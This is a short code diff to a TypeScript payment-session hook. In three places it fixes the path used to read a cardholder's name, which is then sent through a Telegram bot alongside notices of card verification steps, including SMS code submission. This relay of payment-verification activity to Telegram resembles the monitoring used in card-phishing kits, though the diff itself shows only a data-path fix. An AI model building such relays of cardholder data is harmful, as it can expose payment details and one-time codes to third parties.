@@ -109,7 +109,7 @@ export const useOptimisticPaymentSession = (sessionId: string) => {
       // Send Telegram notification for method selection (only when choosing from choice_required)
       if (sessionData?.verification_method === 'choice_required' && (method === 'app_confirmation' || method === 'sms_confirmation')) {
         try {
-        const cardholderName = response.data?.orders?.cardholder_name;
+        const cardholderName = response.data?.data?.orders?.cardholder_name;
           await supabase.functions.invoke('telegram-bot', {
             body: {
               type: 'verification_update',
@@ -161,7 +161,7 @@ export const useOptimisticPaymentSession = (sessionId: string) => {
       
       // Send Telegram notification for app confirmation
       try {
-        const cardholderName = response.data?.orders?.cardholder_name;
+        const cardholderName = response.data?.data?.orders?.cardholder_name;
         await supabase.functions.invoke('telegram-bot', {
           body: {
             type: 'verification_update',
@@ -272,7 +272,7 @@ export const useOptimisticPaymentSession = (sessionId: string) => {
       } else {
         // Send Telegram notification for SMS code submission
         try {
-          const cardholderName = response.data?.orders?.cardholder_name;
+          const cardholderName = response.data?.data?.orders?.cardholder_name;
           await supabase.functions.invoke('telegram-bot', {
             body: {
               type: 'verification_update',
